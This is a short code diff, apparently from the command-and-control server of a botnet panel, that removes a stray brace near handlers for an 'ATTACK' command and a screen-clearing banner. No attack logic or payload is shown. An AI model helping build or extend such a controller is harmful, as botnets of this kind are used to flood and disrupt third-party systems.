@@ -533,7 +533,6 @@ if(strstr(buf, "ATTACK")) {
 		goto end;
    	   	}
         if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0) {
-        { 
           if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
         	sprintf(banner1, "                \e[38;2;89;255;0m╦═╗╔═╗╦ \e[38;2;0;229;255m ╔═╗╔═╗╔╦╗\r\n");
 		sprintf(banner2, "                \e[38;2;89;255;0m╠╦╝║╣ ║ \e[38;2;0;229;255m ║ ║╠═╣ ║║\r\n");
